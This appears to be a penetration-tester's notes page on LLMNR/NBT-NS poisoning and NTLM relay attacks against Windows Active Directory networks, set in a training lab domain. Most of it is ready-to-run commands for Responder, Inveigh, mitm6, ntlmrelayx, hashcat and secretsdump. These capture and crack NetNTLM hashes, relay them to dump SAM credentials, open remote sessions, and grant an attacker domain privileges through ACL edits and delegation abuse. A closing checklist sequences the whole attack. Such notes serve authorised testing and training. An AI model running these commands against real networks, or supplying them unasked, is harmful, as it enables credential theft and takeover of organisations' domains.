# LLMNR & NBT-NS Poisoning

Passive-ish hash harvesting on a switched L2 segment. When a Windows host fails to resolve a name via DNS, it falls back to LLMNR (`UDP/5355`) and NBT-NS (`UDP/137`) — broadcast protocols where **any** host can answer. You answer, the victim authenticates to you, you walk away with a NetNTLM hash.

## The flow

1. User mistypes `\\printer01` or a stale GPO points at a dead share.
2. DNS says no.
3. Host broadcasts: "who is `printer01`?"
4. Responder replies: "me."
5. Victim authenticates to you over SMB/HTTP.
6. You log the NetNTLMv1/v2 challenge-response.

> [!note] MITRE
> T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay.

## Responder (Linux)

### Pure capture

```bash
sudo responder -I eth0
sudo responder -I eth0 -A        # analyze only — no replies, just see who would fall for it
sudo responder -I eth0 -wd       # enable WPAD + answer with signed-auth
```

Hashes land in `/usr/share/responder/logs/` as `SMB-NTLMv2-SSP-<ip>.txt` and in the SQLite DB defined in `Responder.conf`.

### Config for relaying

When you plan to relay instead of crack, **turn off** the servers you want ntlmrelayx to handle. Edit `/etc/responder/Responder.conf` (or `/usr/share/responder/Responder.conf`):

```ini
[Responder Core]
SMB = Off
HTTP = Off
```

Then run Responder for poisoning only, and ntlmrelayx for the relay listeners.

## Cracking

| Hash | Hashcat mode | John format |
|---|---|---|
| NetNTLMv1 | `5500` | `netntlm` |
| NetNTLMv1 + ESS | `5500` | `netntlm` |
| NetNTLMv2 | `5600` | `netntlmv2` |

```bash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

> [!tip] NetNTLMv1 downgrade
> If you see NetNTLMv1 in the wild, feed it to `crack.sh` — full keyspace recovery for a flat fee. Force downgrade with `responder --lm` where allowed by policy.

## Inveigh (Windows equivalent)

Use when you're already on a Windows box inside the segment and can't drop a Linux listener.

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -NBNS Y -mDNS Y -Challenge 1122334455667788
```

C# build (`InveighZero`, the maintained one):

```powershell
.\Inveigh.exe
# press ESC to drop into the console
GET NTLMV2UNIQUE
GET CLEARTEXT
```

## mitm6 — IPv6 is still enabled, still a gift

Windows prefers IPv6. mitm6 answers DHCPv6 and becomes the victim's DNS. Pair with ntlmrelayx targeting LDAPS on the DC for a quick domain object takeover path.

```bash
sudo mitm6 -d inlanefreight.local -i eth0
# in another pane:
sudo ntlmrelayx.py -6 -t ldaps://172.16.5.5 -wh fake-wpad.inlanefreight.local -l loot
```

## ntlmrelayx — spend the hash instead of cracking it

Relaying beats cracking: NetNTLMv2 against a modern policy is painful, but relayed auth to a signing-disabled SMB target or to LDAP is instant code execution or privilege escalation.

### Build the relay target list

```bash
# NetExec generates a list of SMB hosts WITHOUT signing required
nxc smb 172.16.5.0/24 --gen-relay-list targets.txt
```

### Launch

```bash
# Dump SAM on any host you can land on
sudo ntlmrelayx.py -tf targets.txt -smb2support

# Interactive SOCKS — spawn shells on every relayed session
sudo ntlmrelayx.py -tf targets.txt -smb2support -socks

# Via mitm6 against LDAPS: grant the attacker control
sudo ntlmrelayx.py -t ldaps://dc01.inlanefreight.local --escalate-user attacker \
  --delegate-access -smb2support
```

Common flags:

- `--escalate-user <user>` — grants `<user>` DCSync-ish rights by editing domain ACLs when a DA/privileged account relays to LDAP.
- `--delegate-access` — creates a computer account and sets RBCD so you can impersonate anyone to the relayed target.
- `-socks` — queues sessions; use `proxychains` with `secretsdump.py`, `smbclient.py`, etc.

## Using SOCKS sessions

```bash
# ntlmrelayx has given you session 1 against 172.16.5.10 as INLANEFREIGHT\svc_sql
proxychains secretsdump.py INLANEFREIGHT/svc_sql@172.16.5.10 -no-pass
```

## Caveats & gotchas

> [!warning] Windows 11 24H2
> LLMNR is **disabled by default** in Windows 11 24H2 and Server 2025. NBT-NS is still on. mDNS is still on. Modern domains increasingly disable LLMNR via GPO — if Responder is dry, pivot to mitm6 or ADIDNS record injection via Inveigh.

> [!caution] Noisy on a monitored network
> Responder lights up Defender for Identity, DSC, and most EDRs. In an assumed-breach test, coordinate with the blue team. In a red-team, scope the broadcast domain tightly and run in analyze mode first.

- SMB signing required on target → no relay to SMB, but LDAP/LDAPS still open.
- LDAP signing & channel binding enforced → mitm6 → LDAPS path dies; look at HTTP → ADCS ESC8 instead.
- Victim is a machine account → relayed hash is usually only useful for RBCD / resource-based delegation abuse.

## Checklist

- [ ] Analyze mode run first — know what names are broadcast
- [ ] Signing-disabled relay list generated (`--gen-relay-list`)
- [ ] Responder SMB/HTTP toggled off before running ntlmrelayx
- [ ] mitm6 attempted alongside LLMNR for IPv6 prefer-order abuse
- [ ] SOCKS sessions queued, not just one-shot `-c` payloads
- [ ] Captured hashes classified v1 vs v2 before cracking
